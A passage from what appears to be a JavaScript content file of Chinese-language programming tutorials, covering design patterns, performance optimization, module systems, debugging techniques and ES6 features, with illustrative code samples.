    throw new Error('Execute method must be implemented');
  }
  
  undo() {
    throw new Error('Undo method must be implemented');
  }
}

class AddItemCommand extends Command {
  constructor(list, item) {
    super();
    this.list = list;
    this.item = item;
    this.index = null;
  }
  
  execute() {
    this.index = this.list.length;
    this.list.push(this.item);
  }
  
  undo() {
    if (this.index !== null) {
      this.list.splice(this.index, 1);
    }
  }
}

class RemoveItemCommand extends Command {
  constructor(list, index) {
    super();
    this.list = list;
    this.index = index;
    this.item = null;
  }
  
  execute() {
    this.item = this.list[this.index];
    this.list.splice(this.index, 1);
  }
  
  undo() {
    if (this.item !== null) {
      this.list.splice(this.index, 0, this.item);
    }
  }
}

// 命令管理器（支持撤销/重做）
class CommandManager {
  constructor() {
    this.history = [];
    this.redoStack = [];
  }
  
  execute(command) {
    command.execute();
    this.history.push(command);
    this.redoStack = [];
  }
  
  undo() {
    const command = this.history.pop();
    if (command) {
      command.undo();
      this.redoStack.push(command);
    }
  }
  
  redo() {
    const command = this.redoStack.pop();
    if (command) {
      command.execute();
      this.history.push(command);
    }
  }
}

// 使用示例
const list = [];
const manager = new CommandManager();

manager.execute(new AddItemCommand(list, 'Item 1'));
manager.execute(new AddItemCommand(list, 'Item 2'));
console.log(list); // ['Item 1', 'Item 2']

manager.undo();
console.log(list); // ['Item 1']

manager.redo();
console.log(list); // ['Item 1', 'Item 2']
\`\`\`

**迭代器模式（Iterator）：**
迭代器模式提供一种方法顺序访问一个聚合对象中的各个元素，而又不暴露该对象的内部表示。JavaScript 原生支持迭代器协议，通过 Symbol.iterator 实现自定义迭代器。迭代器模式常用于遍历复杂数据结构、实现懒加载等场景。

\`\`\`javascript
// 自定义迭代器
class RangeIterator {
  constructor(start, end, step = 1) {
    this.start = start;
    this.end = end;
    this.step = step;
    this.current = start;
  }
  
  [Symbol.iterator]() {
    return this;
  }
  
  next() {
    if (this.current < this.end) {
      const value = this.current;
      this.current += this.step;
      return { value, done: false };
    }
    return { value: undefined, done: true };
  }
}

const range = new RangeIterator(0, 10, 2);
for (const num of range) {
  console.log(num); // 0, 2, 4, 6, 8
}

// 树形结构迭代器
class TreeIterator {
  constructor(root) {
    this.stack = [root];
  }
  
  [Symbol.iterator]() {
    return this;
  }
  
  next() {
    if (this.stack.length === 0) {
      return { done: true };
    }
    
    const node = this.stack.pop();
    
    if (node.children) {
      for (let i = node.children.length - 1; i >= 0; i--) {
        this.stack.push(node.children[i]);
      }
    }
    
    return { value: node, done: false };
  }
}

// 生成器函数实现迭代器
function* fibonacci(limit) {
  let [prev, curr] = [0, 1];
  while (curr <= limit) {
    yield curr;
    [prev, curr] = [curr, prev + curr];
  }
}

for (const num of fibonacci(100)) {
  console.log(num); // 1, 1, 2, 3, 5, 8, 13, 21, 34, 55, 89
}
\`\`\`

**状态模式（State）：**
状态模式允许一个对象在其内部状态改变时改变它的行为。对象看起来好像修改了它的类。状态模式将状态逻辑分散到不同的状态类中，避免大量的条件判断。在 JavaScript 中，状态模式常用于实现状态机、游戏角色状态、订单状态等场景。

\`\`\`javascript
// 状态模式实现
class TrafficLight {
  constructor() {
    this.state = new RedState(this);
  }
  
  changeState(state) {
    this.state = state;
  }
  
  next() {
    this.state.next();
  }
  
  report() {
    this.state.report();
  }
}

class RedState {
  constructor(light) {
    this.light = light;
  }
  
  next() {
    console.log('Red -> Green');
    this.light.changeState(new GreenState(this.light));
  }
  
  report() {
    console.log('Traffic light is RED - STOP');
  }
}

class GreenState {
  constructor(light) {
    this.light = light;
  }
  
  next() {
    console.log('Green -> Yellow');
    this.light.changeState(new YellowState(this.light));
  }
  
  report() {
    console.log('Traffic light is GREEN - GO');
  }
}

class YellowState {
  constructor(light) {
    this.light = light;
  }
  
  next() {
    console.log('Yellow -> Red');
    this.light.changeState(new RedState(this.light));
  }
  
  report() {
    console.log('Traffic light is YELLOW - CAUTION');
  }
}

// 使用示例
const trafficLight = new TrafficLight();
trafficLight.report(); // Traffic light is RED - STOP
trafficLight.next();   // Red -> Green
trafficLight.report(); // Traffic light is GREEN - GO

// 订单状态机
const OrderState = {
  PENDING: 'pending',
  CONFIRMED: 'confirmed',
  SHIPPED: 'shipped',
  DELIVERED: 'delivered',
  CANCELLED: 'cancelled',
};

const transitions = {
  [OrderState.PENDING]: [OrderState.CONFIRMED, OrderState.CANCELLED],
  [OrderState.CONFIRMED]: [OrderState.SHIPPED, OrderState.CANCELLED],
  [OrderState.SHIPPED]: [OrderState.DELIVERED],
  [OrderState.DELIVERED]: [],
  [OrderState.CANCELLED]: [],
};

function canTransition(from, to) {
  return transitions[from]?.includes(to) ?? false;
}
\`\`\`

### 应用场景

**单页应用架构中的设计模式：**
- 路由管理：观察者模式实现路由变化监听和页面切换
- 状态管理：单例模式确保全局状态唯一性，观察者模式实现状态订阅
- 组件通信：发布-订阅模式实现跨组件通信，避免紧耦合

\`\`\`javascript
// 路由管理器（观察者模式）
class Router {
  constructor() {
    this.routes = {};
    this.currentRoute = null;
    this.listeners = [];
  }
  
  register(path, handler) {
    this.routes[path] = handler;
  }
  
  navigate(path) {
    if (this.routes[path]) {
      this.currentRoute = path;
      this.routes[path]();
      this.listeners.forEach(listener => listener(path));
    }
  }
  
  subscribe(listener) {
    this.listeners.push(listener);
    return () => {
      this.listeners = this.listeners.filter(l => l !== listener);
    };
  }
}

// 全局状态管理（单例 + 观察者）
class AppState {
  static instance = null;
  
  constructor() {
    if (AppState.instance) return AppState.instance;
    AppState.instance = this;
    this.state = {};
    this.listeners = [];
  }
  
  setState(newState) {
    this.state = { ...this.state, ...newState };
    this.listeners.forEach(l => l(this.state));
  }
  
  subscribe(listener) {
    this.listeners.push(listener);
    return () => this.listeners.filter(l => l !== listener);
  }
}
\`\`\`

**表单验证中的设计模式：**
- 策略模式：不同的验证规则作为策略，灵活组合
- 装饰器模式：动态添加验证功能，如实时验证、异步验证
- 责任链模式：多个验证器按顺序执行

\`\`\`javascript
// 表单验证器（策略 + 责任链）
class FormValidator {
  constructor() {
    this.strategies = {};
    this.chain = [];
  }
  
  addStrategy(name, fn) {
    this.strategies[name] = fn;
    return this;
  }
  
  addRule(field, strategyName, ...args) {
    this.chain.push({ field, strategy: strategyName, args });
    return this;
  }
  
  validate(data) {
    const errors = {};
    
    for (const rule of this.chain) {
      const strategy = this.strategies[rule.strategy];
      if (strategy) {
        const error = strategy(data[rule.field], ...rule.args);
        if (error && !errors[rule.field]) {
          errors[rule.field] = error;
        }
      }
    }
    
    return { isValid: Object.keys(errors).length === 0, errors };
  }
}

const validator = new FormValidator()
  .addStrategy('required', v => v ? null : 'Required')
  .addStrategy('email', v => /^[^s@]+@[^s@]+.[^s@]+$/.test(v) ? null : 'Invalid email')
  .addRule('email', 'required')
  .addRule('email', 'email');
\`\`\`

**API 调用中的设计模式：**
- 代理模式：拦截请求和响应，添加缓存、日志等功能
- 适配器模式：适配不同的 API 格式，统一接口
- 装饰器模式：添加重试、超时、认证等功能

\`\`\`javascript
// API 客户端（代理 + 装饰器）
class APIClient {
  constructor(baseURL) {
    this.baseURL = baseURL;
    this.cache = new Map();
    this.interceptors = { request: [], response: [] };
  }
  
  addRequestInterceptor(fn) {
    this.interceptors.request.push(fn);
  }
  
  addResponseInterceptor(fn) {
    this.interceptors.response.push(fn);
  }
  
  async request(endpoint, options = {}) {
    let url = this.baseURL + endpoint;
    let config = options;
    
    // 执行请求拦截器
    for (const interceptor of this.interceptors.request) {
      [url, config] = await interceptor(url, config);
    }
    
    const cacheKey = JSON.stringify({ url, config });
    if (config.cache && this.cache.has(cacheKey)) {
      return this.cache.get(cacheKey);
    }
    
    let response = await fetch(url, config);
    
    // 执行响应拦截器
    for (const interceptor of this.interceptors.response) {
      response = await interceptor(response);
    }
    
    const data = await response.json();
    
    if (config.cache) {
      this.cache.set(cacheKey, data);
    }
    
    return data;
  }
}

const api = new APIClient('https://api.example.com');
api.addRequestInterceptor((url, config) => {
  config.headers = { ...config.headers, Authorization: 'Bearer token' };
  return [url, config];
});
\`\`\`

**动画效果中的设计模式：**
- 策略模式：不同的动画算法（缓动函数）作为策略
- 命令模式：将动画操作封装为命令，支持撤销和队列
- 观察者模式：动画状态变化通知订阅者

\`\`\`javascript
// 动画管理器（策略 + 命令）
const easingStrategies = {
  linear: t => t,
  easeIn: t => t * t,
  easeOut: t => t * (2 - t),
  easeInOut: t => t < 0.5 ? 2 * t * t : -1 + (4 - 2 * t) * t,
};

class Animation {
  constructor(element, property, start, end, duration, easing = 'linear') {
    this.element = element;
    this.property = property;
    this.start = start;
    this.end = end;
    this.duration = duration;
    this.easing = easingStrategies[easing];
    this.startTime = null;
  }
  
  execute() {
    this.startTime = performance.now();
    this.tick();
  }
  
  tick() {
    const elapsed = performance.now() - this.startTime;
    const progress = Math.min(elapsed / this.duration, 1);
    const easedProgress = this.easing(progress);
    const value = this.start + (this.end - this.start) * easedProgress;
    
    this.element.style[this.property] = value + 'px';
    
    if (progress < 1) {
      requestAnimationFrame(() => this.tick());
    }
  }
}
\`\`\`

### 最佳实践

**设计模式使用原则：**
- 理解设计模式的意图和适用场景，避免为了使用模式而使用模式
- 选择适合的设计模式，根据具体问题选择最合适的解决方案
- 避免过度设计，简单问题用简单方案解决
- 结合 JavaScript 的特性，利用闭包、原型链、高阶函数等特性简化实现

\`\`\`javascript
// 过度设计的例子
class SingletonFactoryBuilder {
  // 不必要的复杂性
}

// 简洁的实现
const singleton = {
  instance: null,
  getInstance() {
    if (!this.instance) {
      this.instance = { data: {} };
    }
    return this.instance;
  },
};
\`\`\`

**代码组织与可维护性：**
- 保持代码简洁，设计模式应该简化代码而不是增加复杂性
- 注重可维护性，代码应该易于理解和修改
- 学习设计模式的变体，根据实际需求灵活调整
- 实践中积累经验，在真实项目中应用和体会设计模式

\`\`\`javascript
// 模块化组织设计模式
// patterns/observer.js
export class EventEmitter { /* ... */ }

// patterns/strategy.js
export const strategies = { /* ... */ }

// patterns/factory.js
export class Factory { /* ... */ }

// 使用
import { EventEmitter } from './patterns/observer';
import { strategies } from './patterns/strategy';
\`\`\`

**性能考虑：**
- 观察者模式中注意内存泄漏，及时取消订阅
- 代理模式中注意性能开销，避免过度拦截
- 迭代器模式中注意内存使用，大数据集使用生成器

\`\`\`javascript
// 避免内存泄漏
class Component {
  constructor() {
    this.unsubscribe = store.subscribe(this.handleChange);
  }
  
  handleChange = (state) => {
    // 处理状态变化
  }
  
  destroy() {
    // 清理订阅
    this.unsubscribe();
  }
}

// 使用 WeakMap 避免内存泄漏
const privateData = new WeakMap();

class MyClass {
  constructor() {
    privateData.set(this, { secret: 'value' });
  }
  
  getSecret() {
    return privateData.get(this).secret;
  }
}
\`\`\`

**测试设计模式：**
- 单元测试每个模式的核心功能
- 测试模式的边界情况
- 测试模式之间的交互

\`\`\`javascript
// 测试观察者模式
describe('EventEmitter', () => {
  it('should call listeners when event is emitted', () => {
    const emitter = new EventEmitter();
    const listener = jest.fn();
    
    emitter.on('test', listener);
    emitter.emit('test', 'data');
    
    expect(listener).toHaveBeenCalledWith('data');
  });
  
  it('should unsubscribe correctly', () => {
    const emitter = new EventEmitter();
    const listener = jest.fn();
    
    const unsubscribe = emitter.on('test', listener);
    unsubscribe();
    emitter.emit('test', 'data');
    
    expect(listener).not.toHaveBeenCalled();
  });
});
\`\`\``,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"javascript-performance",title:"JavaScript 性能优化最佳实践",category:"javascript",difficulty:"medium",tags:["JavaScript","性能优化","内存","执行速度"],content:`## JavaScript 性能优化最佳实践

JavaScript 性能直接影响应用的用户体验。一个高性能的 JavaScript 应用应该具备快速响应、流畅动画、低内存占用等特点。性能优化是一个持续的过程，需要在开发的各个阶段关注。以下是一些关键的性能优化策略，涵盖代码优化、内存管理、异步处理、DOM 操作等多个方面。

### 代码优化

**变量声明与作用域：**
- 使用 let 和 const 代替 var，利用块级作用域避免变量提升问题
- 减少全局变量的使用，全局变量会污染全局命名空间，增加查找时间
- 合理使用闭包，闭包会保持对外部变量的引用，可能导致内存泄漏

\`\`\`javascript
// ❌ 避免：全局变量污染
var globalVar = 'global';

// ✅ 推荐：使用模块作用域
const Module = (() => {
  const privateVar = 'private';
  return {
    getPrivate: () => privateVar,
  };
})();

// ❌ 避免：闭包导致的内存问题
function createHandlers() {
  const handlers = [];
  for (var i = 0; i < 10; i++) {
    handlers.push(function() {
      console.log(i); // 所有函数都输出 10
    });
  }
  return handlers;
}

// ✅ 推荐：使用 let 或 IIFE
function createHandlers() {
  const handlers = [];
  for (let i = 0; i < 10; i++) {
    handlers.push(() => console.log(i)); // 输出 0-9
  }
  return handlers;
}
\`\`\`

**函数优化：**
- 避免在循环中定义函数，每次迭代都会创建新的函数对象
- 使用箭头函数简化代码，但注意 this 绑定问题
- 合理使用函数柯里化，实现函数复用和延迟计算

\`\`\`javascript
// ❌ 避免：循环中创建函数
const handlers = [];
for (let i = 0; i < 1000; i++) {
  handlers.push(function() {
    return i * 2;
  });
}

// ✅ 推荐：提取函数
const double = (i) => i * 2;
const handlers = [];
for (let i = 0; i < 1000; i++) {
  handlers.push(() => double(i));
}

// 函数柯里化优化
const curry = (fn) => {
  return function curried(...args) {
    if (args.length >= fn.length) {
      return fn.apply(this, args);
    }
    return (...moreArgs) => curried.apply(this, args.concat(moreArgs));
  };
};

const add = (a, b, c) => a + b + c;
const curriedAdd = curry(add);
const add5 = curriedAdd(5); // 部分应用，复用函数
\`\`\`

**循环优化：**
- 使用 for 循环代替 forEach，for 循环性能更好
- 缓存数组长度，避免每次迭代都计算
- 避免在循环中进行 DOM 操作，使用 DocumentFragment 批量操作

\`\`\`javascript
// ❌ 避免：每次迭代都计算长度
for (let i = 0; i < array.length; i++) {
  // ...
}

// ✅ 推荐：缓存数组长度
for (let i = 0, len = array.length; i < len; i++) {
  // ...
}

// ❌ 避免：循环中进行 DOM 操作
for (let i = 0; i < items.length; i++) {
  const li = document.createElement('li');
  li.textContent = items[i];
  list.appendChild(li); // 每次都触发重排
}

// ✅ 推荐：使用 DocumentFragment
const fragment = document.createDocumentFragment();
for (let i = 0; i < items.length; i++) {
  const li = document.createElement('li');
  li.textContent = items[i];
  fragment.appendChild(li);
}
list.appendChild(fragment); // 只触发一次重排
\`\`\`

**条件优化：**
- 使用 switch 代替多个 if-else，switch 使用跳转表优化
- 将最常见的条件放在前面，减少判断次数
- 使用对象字面量代替条件判断，提高可读性和性能

\`\`\`javascript
// ❌ 避免：多个 if-else
function getStatus(status) {
  if (status === 'pending') return '等待中';
  else if (status === 'processing') return '处理中';
  else if (status === 'completed') return '已完成';
  else if (status === 'failed') return '失败';
  else return '未知';
}

// ✅ 推荐：使用对象字面量
const statusMap = {
  pending: '等待中',
  processing: '处理中',
  completed: '已完成',
  failed: '失败',
};

function getStatus(status) {
  return statusMap[status] || '未知';
}

// ✅ 推荐：使用 Map（更高效）
const statusMap = new Map([
  ['pending', '等待中'],
  ['processing', '处理中'],
  ['completed', '已完成'],
  ['failed', '失败'],
]);
\`\`\`

### 内存管理

**内存泄漏常见原因与预防：**
- 避免循环引用，特别是 DOM 元素与 JavaScript 对象之间的引用
- 清理定时器和事件监听器，组件销毁时必须清理
- 释放不再使用的对象引用，帮助垃圾回收器回收内存

\`\`\`javascript
// ❌ 避免：未清理的定时器
class Component {
  constructor() {
    this.timer = setInterval(() => {
      this.updateData();
    }, 1000);
  }
  // 缺少清理逻辑
}

// ✅ 推荐：正确清理
class Component {
  constructor() {
    this.timer = setInterval(() => {
      this.updateData();
    }, 1000);
  }
  
  destroy() {
    clearInterval(this.timer);
  }
}

// ❌ 避免：未移除的事件监听器
class Modal {
  constructor() {
    document.addEventListener('keydown', this.handleKeydown);
  }
}

// ✅ 推荐：正确移除监听器
class Modal {
  constructor() {
    this.handleKeydown = this.handleKeydown.bind(this);
    document.addEventListener('keydown', this.handleKeydown);
  }
  
  destroy() {
    document.removeEventListener('keydown', this.handleKeydown);
  }
}

// ❌ 避免：闭包持有大对象引用
function createProcessor(largeData) {
  return function process() {
    // 即使只用一部分数据，整个 largeData 都被引用
    return largeData[0];
  };
}

// ✅ 推荐：只保留需要的数据
function createProcessor(largeData) {
  const neededData = largeData[0];
  return function process() {
    return neededData;
  };
}
\`\`\`

**垃圾回收机制理解：**
- JavaScript 使用标记清除算法进行垃圾回收
- 避免创建过多的临时对象，减少 GC 压力
- 使用 WeakMap 和 WeakSet 存储对象引用，不阻止垃圾回收

\`\`\`javascript
// WeakMap 示例：不阻止垃圾回收
const privateData = new WeakMap();

class MyClass {
  constructor() {
    privateData.set(this, { secret: 'value' });
  }
  
  getSecret() {
    return privateData.get(this)?.secret;
  }
}

// 当 MyClass 实例被销毁时，WeakMap 中的数据也会被回收

// WeakSet 示例：跟踪对象而不阻止回收
const visitedObjects = new WeakSet();

function processObject(obj) {
  if (visitedObjects.has(obj)) {
    return; // 已处理过
  }
  visitedObjects.add(obj);
  // 处理对象
}
\`\`\`

**内存优化技巧：**
- 使用对象池复用对象，减少对象创建和销毁的开销
- 合理使用缓存，但要注意缓存大小和过期策略
- 减少内存分配，重用数组和对象

\`\`\`javascript
// 对象池模式
class ObjectPool {
  constructor(factory, initialSize = 10) {
    this.factory = factory;
    this.pool = [];
    for (let i = 0; i < initialSize; i++) {
      this.pool.push(factory());
    }
  }
  
  acquire() {
    return this.pool.length > 0 ? this.pool.pop() : this.factory();
  }
  
  release(obj) {
    // 重置对象状态
    Object.keys(obj).forEach(key => delete obj[key]);
    this.pool.push(obj);
  }
}

// 使用示例
const vectorPool = new ObjectPool(() => ({ x: 0, y: 0, z: 0 }));

function calculate() {
  const v = vectorPool.acquire();
  // 使用 v 进行计算
  vectorPool.release(v);
}

// 数组复用
const tempArray = [];
function processItems(items) {
  tempArray.length = 0; // 清空但保留内存
  for (const item of items) {
    if (item.active) {
      tempArray.push(item);
    }
  }
  return tempArray;
}
\`\`\`

### 异步优化

**异步操作：**
- 使用 Promise 和 async/await
- 避免回调地狱
- 合理控制并发数量

**网络请求：**
- 合并请求
- 使用缓存
- 实现请求节流

**资源加载：**
- 延迟加载非关键资源
- 预加载关键资源
- 使用 CDN

### 浏览器优化

**DOM 操作：**
- 减少 DOM 操作次数
- 使用 DocumentFragment
- 批量更新 DOM

**事件处理：**
- 使用事件委托
- 避免过多的事件监听器
- 清理事件监听器

**渲染优化：**
- 避免重排和重绘
- 使用 CSS 动画代替 JavaScript 动画
- 合理使用 requestAnimationFrame

### 工具和监控

**性能分析：**
- 使用 Chrome DevTools
- 分析执行时间
- 识别性能瓶颈

**监控工具：**
- Lighthouse
- Web Vitals
- 自定义性能监控

**构建优化：**
- 代码压缩
- 代码分割
-  tree-shaking

### 最佳实践

- 编写高效的算法
- 合理使用数据结构
- 避免不必要的计算
- 优化关键路径
- 定期性能测试
- 持续优化
- 学习性能优化技巧
- 关注性能最佳实践`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"javascript-modules",title:"JavaScript 模块化开发与实践",category:"javascript",difficulty:"medium",tags:["JavaScript","模块化","ES modules","CommonJS"],content:`## JavaScript 模块化开发与实践

模块化是现代 JavaScript 开发的重要特性，它使代码更加组织化、可维护和可复用。

### 模块化的演进

**全局变量：**
- 最早的模块化方式
- 容易导致命名冲突
- 代码难以维护

**IIFE (立即执行函数表达式)：**
- 创建私有作用域
- 避免全局变量污染
- 支持模块模式

**CommonJS：**
- Node.js 的模块系统
- 使用 require() 和 module.exports
- 同步加载模块

**AMD (Asynchronous Module Definition)：**
- 异步加载模块
- 使用 define() 和 require()
- 适合浏览器环境

**ES modules：**
- ECMAScript 标准模块系统
- 使用 import 和 export
- 支持静态分析
- 浏览器和 Node.js 都支持

### ES modules 核心特性

**导出：**
- 命名导出：export const name = value;
- 默认导出：export default value;
- 重导出：export { name } from './module';

**导入：**
- 命名导入：import { name } from './module';
- 默认导入：import name from './module';
- 命名空间导入：import * as module from './module';
- 动态导入：import('./module').then(module => {});

**模块解析：**
- 相对路径：./module
- 绝对路径：/module
- 裸模块：module

### 模块化工具

**打包工具：**
- Webpack：功能丰富，生态完整
- Rollup：适合库打包，Tree-shaking 效果好：Rollup是JavaScript模块打包器，专注于库打包，输出代码简洁高效，Tree-shaking效果优秀，可以自动移除未使用的代码，Rollup使用ES模块格式，支持插件系统，是许多前端框架（如Vue、React）底层使用的打包工具
- Vite：快速的开发服务器，适合现代前端：Vite是新一代前端构建工具，利用ES模块原生支持实现极速的冷启动和热更新，开发体验极佳，支持TypeScript、CSS预处理器、各种框架模板，Vite使用Rollup进行生产构建，生态丰富，是现代前端项目的首选构建工具

**构建工具：**
- Babel：转译 ES6+ 代码：Babel是JavaScript编译器，用于将ES6+、TypeScript、JSX等现代JavaScript语法转换为浏览器兼容的ES5代码，Babel通过插件系统支持各种语法转换和polyfill，是现代前端开发的基础工具，支持React、Vue等框架的JSX语法
- TypeScript：类型检查和转译
- SWC：快速的 JavaScript/TypeScript 编译器

**包管理器：**
- npm：Node.js 官方包管理器
- yarn：Facebook 开发的包管理器
- pnpm：快速的包管理器，节省磁盘空间

### 模块化最佳实践

**模块设计：**
- 单一职责原则
- 合理的模块大小
- 清晰的模块接口

**命名规范：**
- 文件名使用小写和连字符
- 模块名与文件名保持一致
- 避免使用保留字

**依赖管理：**
- 明确的依赖关系
- 避免循环依赖
- 合理使用 peer dependencies

**代码组织：**
- 按功能组织模块
- 公共模块与业务模块分离
- 建立清晰的目录结构

**测试：**
- 模块化测试
- 单元测试
- 集成测试

### 实际应用

**前端应用：**
- 组件模块化
- 工具函数模块化
- 状态管理模块化

**Node.js 应用：**
- 路由模块化
- 中间件模块化
- 服务模块化

**库开发：**
- 核心功能模块化
- 插件系统
- 按需导入`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"javascript-debugging",title:"JavaScript 调试技巧与最佳实践",category:"javascript",difficulty:"medium",tags:["JavaScript","调试","DevTools","错误处理"],content:`## JavaScript 调试技巧与最佳实践

调试是开发过程中的重要环节，掌握有效的调试技巧可以提高开发效率和代码质量。

### 调试工具

**Chrome DevTools：**
- 控制台 (Console)：输出日志和错误
- 源码 (Sources)：查看和调试代码
- 网络 (Network)：分析网络请求
- 性能 (Performance)：分析性能
- 内存 (Memory)：分析内存使用
- 应用 (Application)：查看存储和缓存

**Node.js 调试：**
- 使用 --inspect 标志
- Chrome DevTools 连接
- VS Code 调试器

**其他调试工具：**
- VS Code 调试器
- WebStorm 调试器
- 第三方调试库

### 调试技巧

**控制台调试：**
- console.log()：基本日志
- console.warn()：警告信息
- console.error()：错误信息
- console.table()：表格形式展示数据
- console.time()：测量执行时间
- console.trace()：显示调用栈

**断点调试：**
- 行断点：在特定行设置
- 条件断点：满足条件时触发
- 日志断点：不暂停执行，只输出日志
- 异常断点：捕获异常时触发
- DOM 断点：DOM 变化时触发

**网络调试：**
- 查看请求和响应
- 分析请求头和响应头
- 模拟网络条件
- 阻止请求
- 重放请求

**性能调试：**
- 分析执行时间
- 识别瓶颈
- 内存泄漏检测
- 垃圾回收分析

### 错误处理

**错误类型：**
- 语法错误：代码语法错误
- 运行时错误：执行时发生的错误
- 逻辑错误：代码逻辑不正确

**错误处理策略：**
- try/catch：捕获同步错误
- Promise.catch()：捕获异步错误
- window.onerror：全局错误处理
- unhandledrejection：未处理的 Promise 拒绝

**错误监控：**
- 自定义错误监控
- Sentry 等错误监控服务
- 日志收集

### 调试最佳实践

**代码组织：**
- 模块化代码
- 清晰的函数和变量命名
- 适当的注释

**调试流程：**
- 重现问题
- 定位问题
- 分析原因
- 修复问题
- 验证修复

**预防性措施：**
- 单元测试
- 类型检查
- 代码审查
- 静态分析

**调试技巧：**
- 简化问题
- 隔离测试
- 逐步调试
- 记录状态
- 利用版本控制

**团队协作：**
- 统一的调试工具和流程
- 共享调试经验
- 文档化常见问题

### 实际应用

**前端调试：**
- DOM 操作调试
- 事件处理调试
- 异步操作调试
- 性能问题调试

**Node.js 调试：**
- 服务器端调试
- API 调试
- 数据库操作调试
- 中间件调试

**生产环境调试：**
- 日志分析
- 错误监控
- A/B 测试
- 用户行为分析`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"javascript-ecmascript",title:"ECMAScript 新特性与最佳实践",category:"javascript",difficulty:"medium",tags:["JavaScript","ES6+","新特性","语法"],content:`## ECMAScript 新特性与最佳实践

ECMAScript 标准不断演进，每年都会发布新版本，带来许多新特性和语法糖。这些新特性不仅提高了开发效率和代码质量，还让 JavaScript 代码更加简洁、可读、可维护。理解并掌握这些新特性对于现代 JavaScript 开发至关重要。

### ES6 (ES2015) 核心特性

**let 和 const 声明：**
ES6 引入了 let 和 const 关键字，解决了 var 声明的变量提升和函数作用域问题。let 声明的变量具有块级作用域，const 声明的变量是常量，不可重新赋值。使用 let 和 const 可以避免很多常见的错误，提高代码的可预测性。

\`\`\`javascript
// var 的问题
console.log(a); // undefined（变量提升）
var a = 10;

for (var i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 100);
}
// 输出: 3, 3, 3（函数作用域问题）

// let 解决变量提升
console.log(b); // ReferenceError
let b = 10;

// let 解决循环问题
for (let i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 100);
}
// 输出: 0, 1, 2（块级作用域）

// const 常量
const PI = 3.14159;
// PI = 3.14; // TypeError

// const 对象属性可修改
const user = { name: 'Alice' };
user.name = 'Bob'; // OK
// user = {}; // TypeError

// 冻结对象使其完全不可变
const frozenUser = Object.freeze({ name: 'Alice' });
// frozenUser.name = 'Bob'; // 静默失败（严格模式下报错）
\`\`\`

**箭头函数：**
箭头函数提供了更简洁的函数语法，并且自动绑定词法 this。箭头函数没有自己的 this、arguments、super 或 new.target，适合用于回调函数和需要保持外层 this 上下文的场景。

\`\`\`javascript
// 传统函数
const add = function(a, b) {
  return a + b;
};

// 箭头函数
const add = (a, b) => a + b;

// 单参数可省略括号
const double = x => x * 2;

// 返回对象需要括号
const createUser = (name, age) => ({ name, age });

// this 绑定示例
const obj = {
  name: 'Alice',
  
  // 传统函数：this 指向调用者
  greetTraditional: function() {
    setTimeout(function() {
      console.log('Hello, ' + this.name); // undefined（this 丢失）
    }, 100);
  },
  
  // 箭头函数：this 继承自外层
  greetArrow: function() {
    setTimeout(() => {
      console.log('Hello, ' + this.name); // 'Hello, Alice'
    }, 100);
  },
  
  // 箭头函数作为方法：this 指向外层作用域
  greetMethod: () => {
    console.log('Hello, ' + this.name); // undefined（this 指向全局）
  },
};

// 箭头函数不能作为构造函数
const Person = (name) => {
  this.name = name;
};
// new Person('Alice'); // TypeError

// 箭头函数没有 arguments
const fn = () => {
  // console.log(arguments); // ReferenceError
};
\`\`\`

**模板字符串：**
模板字符串使用反引号（\`）包裹，支持多行字符串、变量插值和表达式嵌入。模板字符串让字符串拼接更加直观和方便，特别适合生成 HTML 模板、SQL 查询等场景。

\`\`\`javascript
// 基本用法
const name = 'Alice';
const greeting = \`Hello, \${name}!\`;
console.log(greeting); // 'Hello, Alice!'

// 多行字符串
const html = \`
  <div class="card">
    <h2>\${title}</h2>
    <p>\${content}</p>
  </div>
\`;

// 表达式嵌入
const a = 10;
const b = 20;
console.log(\`\${a} + \${b} = \${a + b}\`); // '10 + 20 = 30'

// 嵌套模板
const items = ['Apple', 'Banana', 'Orange'];
const list = \`
  <ul>
    \${items.map(item => \`<li>\${item}</li>\`).join('')}
  </ul>
\`;

// 标签模板
function highlight(strings, ...values) {
  return strings.reduce((result, str, i) => {
    const value = values[i] ? \`<mark>\${values[i]}</mark>\` : '';
    return result + str + value;
  }, '');
}

const search = 'JavaScript';
const text = highlight\`Learning \${search} is fun!\`;
// 'Learning <mark>JavaScript</mark> is fun!'

// 原始字符串
const raw = String.raw\`Line 1\\nLine 2\`;
console.log(raw); // 'Line 1\\nLine 2'（不转义）
\`\`\`

**解构赋值：**
解构赋值允许从数组或对象中提取值，并赋给变量。解构赋值可以简化代码，使数据提取更加直观。支持数组解构、对象解构、函数参数解构等多种形式。

\`\`\`javascript
// 数组解构
const [first, second, ...rest] = [1, 2, 3, 4, 5];
console.log(first); // 1
console.log(second); // 2
console.log(rest); // [3, 4, 5]

// 跳过元素
const [, , third] = [1, 2, 3];
console.log(third); // 3

// 默认值
const [a = 10, b = 20] = [1];
console.log(a, b); // 1, 20

// 交换变量
let x = 1, y = 2;
[x, y] = [y, x];

// 对象解构
const user = { name: 'Alice', age: 25, city: 'NYC' };
const { name, age, country = 'USA' } = user;
console.log(name, age, country); // 'Alice', 25, 'USA'

// 重命名
const { name: userName, age: userAge } = user;
console.log(userName, userAge); // 'Alice', 25

// 嵌套解构
const company = {
  name: 'Tech Corp',
  address: {
    city: 'San Francisco',
    country: 'USA',
  },
};
const { address: { city } } = company;
console.log(city); // 'San Francisco'

// 函数参数解构
function greet({ name, age = 0 }) {
  console.log(\`Hello, \${name}! You are \${age} years old.\`);
}
greet({ name: 'Alice', age: 25 });

// 解构配合默认参数
function fetchData({ url, method = 'GET', headers = {} } = {}) {
  console.log(url, method, headers);
}
fetchData({ url: '/api/data' });
\`\`\`

**默认参数：**
ES6 允许为函数参数设置默认值，当参数为 undefined 时使用默认值。默认参数使函数更加健壮，减少了对参数检查的需求。

\`\`\`javascript
// 基本默认参数
function greet(name = 'World') {
  console.log(\`Hello, \${name}!\`);
}
greet(); // 'Hello, World!'
greet('Alice'); // 'Hello, Alice!'

// 默认参数可以是表达式
function getValue(value = computeDefault()) {
  return value;
}

// 默认参数可以引用前面的参数
function greet(name, greeting = \`Hello, \${name}\`) {
  console.log(greeting);
}
greet('Alice'); // 'Hello, Alice'

// 默认参数与解构结合
function createUser({ name = 'Anonymous', age = 0 } = {}) {
  return { name, age };
}
createUser(); // { name: 'Anonymous', age: 0 }
